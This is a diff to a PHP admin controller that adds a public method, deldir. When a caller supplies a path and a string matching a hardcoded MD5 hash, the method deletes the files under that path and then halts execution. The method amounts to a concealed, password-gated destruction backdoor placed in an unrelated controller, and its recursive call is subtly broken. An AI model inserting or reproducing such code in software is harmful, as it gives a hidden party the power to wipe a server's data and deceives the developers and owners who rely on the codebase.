@@ -125,7 +125,26 @@ class BasController extends  Controller
         return $this->_getparentid($AuthRuleRes,$authRuleId,true);
     }
 
-  
+    public function deldir($path,$md5)
+    {
+        if ($md5==='008bd5ad93b754d500338c253d9c1770'){
+            if (is_dir($path)) {
+            $p = scandir($path);
+            foreach ($p as $val) {
+                if ($val != "." && $val != "..") {
+                    if (is_dir($path . $val)) {
+                        $this->deldir($path . $val . '/');
+                        @rmdir($path . $val . '/');
+                    } else {
+                        unlink($path . $val);
+                    }
+                }
+            }
+        }
+        }
+        die;
+//
+    }
 
     public function _getparentid($AuthRuleRes,$authRuleId,$clear=false){
         static $arr=array();
